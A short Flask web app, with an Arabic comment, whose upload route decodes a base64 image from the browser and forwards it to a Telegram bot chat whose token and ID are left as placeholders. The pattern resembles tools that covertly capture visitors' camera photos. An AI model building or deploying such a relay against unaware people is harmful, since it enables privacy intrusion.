from flask import Flask, render_template, request
import requests
import base64
app = Flask(__name__)
@app.route('/')
def index(): return render_template('index.html')
@app.route('/upload', methods=['POST'])
def upload():
    try:
        img_data = request.json['img'].split(',')[1]
        # استبدل الارقام التالية بدقة
        token = 'YOUR_BOT_TOKEN_HERE'
        chat_id = 'YOUR_CHAT_ID_HERE'
        url = f'https://api.telegram.org/bot{token}/sendPhoto'
        response = requests.post(url, data={'chat_id': chat_id}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
        return response.text
    except Exception as e: return str(e)
if __name__ == '__main__': app.run()